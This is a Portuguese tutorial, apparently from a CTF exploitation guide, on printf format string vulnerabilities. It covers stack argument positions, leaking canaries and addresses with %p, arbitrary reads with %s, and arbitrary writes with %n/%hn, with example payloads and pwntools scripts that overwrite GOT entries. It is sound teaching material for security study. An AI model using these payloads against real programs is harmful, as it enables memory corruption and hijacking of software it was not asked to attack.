---
title: "Format Strings"
sidebar_position: 2
---

O `printf` não sabe quantos argumentos recebeu. Para cada especificador (`%x`, `%s`, ...) na format string, ele busca o próximo argumento onde a [convenção de chamada](../../extra/call-convention.mdx) diz que ele estaria. Se o argumento não foi passado, ele lê o que estiver lá:

```c
int value = 1205;

printf("%x %x %x", value, value, value);   // 4b5 4b5 4b5
printf("%x %x %x", value);                 // 4b5 5659b000 565981b0  ← lixo de registradores/stack
```

A vulnerabilidade existe quando **o usuário controla a format string**:

```c
printf(buffer);          // vulnerável
printf("%s", buffer);    // correto
```

Vale para toda a família: `fprintf`, `sprintf`, `snprintf`, `dprintf`, `syslog`, `err`, etc. Com isso se obtém leitura da stack, leitura arbitrária (`%s`) e escrita arbitrária (`%n`), sem nenhum overflow.

## De onde o `printf` tira os argumentos

O que importa é saber qual "argumento N" corresponde a qual posição de memória.

### x86 (32 bits)

Todos os argumentos vão na stack. Para `printf(buffer)`, só o ponteiro para a format string foi empilhado, e os "argumentos" seguintes são simplesmente o que vem depois dele: o frame da função que chamou.

<Mem
  title="Stack no momento do call printf (32 bits)"
  top="endereços baixos"
  bottom="endereços altos"
  rows={[
    {addr: 'esp', label: 'ponteiro para a format string', kind: 'meta', note: 'argumento 0'},
    {addr: 'esp+0x4', label: '?', kind: 'ctrl', note: '%1$x'},
    {addr: 'esp+0x8', label: '?', kind: 'ctrl', note: '%2$x'},
    {addr: 'esp+0xc', label: '?', kind: 'ctrl', note: '%3$x'},
    {gap: true},
    {label: 'buffer (variável local)', kind: 'data', h: 1.4, note: '%N$x: o próprio input'},
    {label: 'ebp salvo', kind: 'neutral'},
    {label: 'return address', kind: 'neutral'},
  ]}
/>

Exemplo com `gets(buffer); printf(buffer);` e o input `%x %x %x %x %x`:

```
f7f74080 0 5657b1c0 782573fc 20782520
```

Os dois últimos valores já são o próprio buffer: `25 78 20` é `%x ` em ASCII.

### x86-64

Os seis primeiros argumentos vão em registradores, e só depois vem a stack:

| Especificador | Origem |
|---|---|
| (format string) | `rdi` |
| `%1$p` a `%5$p` | `rsi`, `rdx`, `rcx`, `r8`, `r9` |
| `%6$p` | `[rsp]` no momento do `call` |
| `%7$p`, `%8$p`, ... | `[rsp+8]`, `[rsp+0x10]`, ... |

Regra prática: **`%(6 + k)$p` lê `[rsp + 8*k]`**. Para saber o índice de qualquer coisa na stack, pare no `call printf` no GDB, veja a distância até `rsp`, divida por 8 e some 6.

Em 64 bits, `%x` imprime só 4 bytes. Para ver valores inteiros use `%p` ou `%lx`.

## Especificadores

| Especificador | Efeito | Uso |
|---|---|---|
| `%p` | Imprime 8 bytes (4 em 32 bits) como ponteiro, com `0x` | Leaks |
| `%x` / `%lx` | Imprime 4 / 8 bytes em hexadecimal | Leaks |
| `%s` | Trata o argumento como **ponteiro** e imprime a string que está lá | Leitura arbitrária. Ponteiro inválido = `SIGSEGV` |
| `%n` | **Escreve** no endereço do argumento a quantidade de caracteres impressos até ali (4 bytes) | Escrita arbitrária |
| `%hn` / `%hhn` | Como `%n`, mas escreve 2 bytes / 1 byte | Escrita em pedaços |
| `%N$...` | Usa diretamente o N-ésimo argumento (`%7$p`, `%7$s`, `%7$n`) | Apontar para a posição exata |
| `%Nc` | Imprime `N` caracteres (preenche com espaços) | Controlar o contador do `%n` |

## Reconhecimento

**1. Confirmar e achar a posição do buffer.** Envie um marcador seguido de `%p`:

```
AAAAAAAA.%p.%p.%p.%p.%p.%p.%p.%p
AAAAAAAA.0x7ffe....0x10.(nil).0x7f....0x4141414141414141.0x70252e70252e7025
                                             ↑ 6º argumento: o início do buffer
```

A posição em que aparece `0x4141414141414141` é o **offset** do buffer. Confirme com `AAAAAAAA%6$p`. Se o marcador aparecer cortado entre dois argumentos, o buffer não está alinhado em 8 bytes: acrescente caracteres de padding antes dele.

**2. Identificar os leaks.** Despeje um intervalo (`%1$p` a `%40$p`) e classifique os valores comparando com o `vmmap`:

| Valor | Provavelmente é | Serve para |
|---|---|---|
| `0x55...` / `0x56...` (ou `0x40....` sem PIE) | Endereço do binário | Base do PIE |
| `0x7f...` | libc ou `ld.so` (ex: o retorno da `main` para `__libc_start_call_main`) | Base da libc |
| `0x7ffc...` / `0x7ffe...` | Stack | Localizar o return address |
| Termina em `00` e parece aleatório | **Canary** | Bypass do canary |

Os índices são estáveis entre execuções: ache uma vez no GDB qual `%N$p` é o canary ou o endereço da libc, e use esse índice no exploit.

## Leitura arbitrária

Colocamos um endereço dentro do nosso buffer e usamos `%N$s` para que o `printf` o trate como ponteiro. Em 64 bits com o buffer no offset 6:

```py
payload  = b'%7$sAAAA'           # 8 bytes: ocupa o argumento 6
payload += p64(0x404000)         # argumento 7: o endereço a ler
```

O endereço fica **depois** dos especificadores porque, em 64 bits, endereços contêm bytes nulos e o `printf` para de processar a format string no primeiro `\0`. Em 32 bits (`0x0804c00c` não tem byte nulo), o endereço pode vir no começo, como nos tutoriais antigos.

O `%s` lê até encontrar um `\0`. Para ler um ponteiro (uma entrada da GOT, por exemplo), pegue os bytes recebidos e complete com `ljust(8, b'\0')` antes do `u64`.

## Escrita arbitrária

O `%n` grava o **número de caracteres impressos até aquele ponto**. Para escrever um valor, imprimimos essa quantidade de caracteres com `%Nc` e apontamos o `%n` para o endereço alvo. Como imprimir `0x7fff...` caracteres é inviável, escreve-se em pedaços de 2 bytes (`%hn`) ou 1 byte (`%hhn`), um endereço por pedaço.

Exemplo: escrever `0xdeadbeef` em `0x404020`, buffer no offset 6.

<Mem
  title="Payload na stack: format string primeiro, endereços no fim"
  rows={[
    {addr: 'arg 6 a 9', label: '%48879c%10$hn%8126c%11$hn + padding', kind: 'ctrl', note: '32 bytes = 4 argumentos'},
    {addr: 'arg 10', label: 'p64(0x404020)', kind: 'ptr', note: 'recebe 0xbeef'},
    {addr: 'arg 11', label: 'p64(0x404022)', kind: 'ptr', note: 'recebe 0xdead'},
  ]}
  cellW={330}
/>

1. `%48879c` imprime 48879 caracteres. Contador = `0xbeef`.
2. `%10$hn` grava `0xbeef` (2 bytes) no endereço do argumento 10.
3. `%8126c` imprime mais 8126. Contador = 57005 = `0xdead`.
4. `%11$hn` grava `0xdead` em `0x404022`.
5. Memória: `ef be ad de` = `0xdeadbeef`.

Detalhes que fazem isso dar errado quando feito à mão:

- O contador só cresce, então os pedaços são escritos **em ordem crescente de valor** (não de endereço). Para "diminuir", use o overflow do pedaço: com `%hhn`, imprimir mais `0x100 - atual + desejado` caracteres dá a volta.
- A format string precisa ocupar um múltiplo de 8 bytes (4 em 32 bits) para os endereços caírem exatamente em um argumento. Mudar a string muda quantos argumentos ela ocupa, e portanto os índices.
- Tudo o que é impresso antes do `%n` conta, inclusive texto fixo que o programa imprima na mesma chamada.

### Com pwntools

O `fmtstr_payload` faz toda essa conta:

```py
from pwn import *

context.binary = elf = ELF('./vuln')    # necessário: define 32/64 bits
p = process()

offset = 6                               # posição do buffer
payload = fmtstr_payload(offset, {elf.got['puts']: elf.sym['win']})
p.sendline(payload)
p.interactive()
```

Parâmetros úteis: `write_size='short'` (usa `%hn`, payload menor que o padrão `'byte'`) e `numbwritten=N` (caracteres já impressos antes do nosso input na mesma chamada).

A classe `FmtStr` descobre o offset sozinha, dado um jeito de enviar um payload e receber a resposta:

```py
def send_fmt(payload):
    p.sendline(payload)
    return p.recvline()

fmt = FmtStr(execute_fmt=send_fmt)
print(fmt.offset)
fmt.write(elf.got['puts'], elf.sym['win'])
fmt.execute_writes()
```

## O que sobrescrever

| Alvo | Condição |
|---|---|
| Entrada da GOT ([GOT Overwrite](./got-overwrite.md)) | Sem Full RELRO |
| Return address na stack | Leak de stack para saber onde ele está |
| `.fini_array` (chamado na saída do programa) | Sem RELRO |
| `__malloc_hook` / `__free_hook` | glibc < 2.34. Um `printf` com saída grande chama `malloc` |
| Variável do programa (`is_admin`, contador de tentativas) | Endereço conhecido |

Se o programa chama `printf` uma única vez, o primeiro passo costuma ser ganhar mais chamadas: sobrescrever uma entrada da GOT (ou `.fini_array`) com o endereço da `main` ou da função vulnerável.

## Limitações

- **`fgets`/`read` com tamanho pequeno**: o payload precisa caber. `write_size='short'` e escrever em mais de uma rodada ajudam.
- **[Fortify](../protections.mdx#fortify-source)**: `__printf_chk` bloqueia `%n` e `%N$`. Leaks com `%p` em sequência continuam possíveis.
- **Buffer fora da stack** (heap ou `.bss`): você não consegue colocar endereços entre os argumentos. A saída é usar ponteiros que **já estão** na stack e apontam para outras posições da stack (cadeia de `rbp` salvos, `argv`) para construir o endereço em duas etapas.
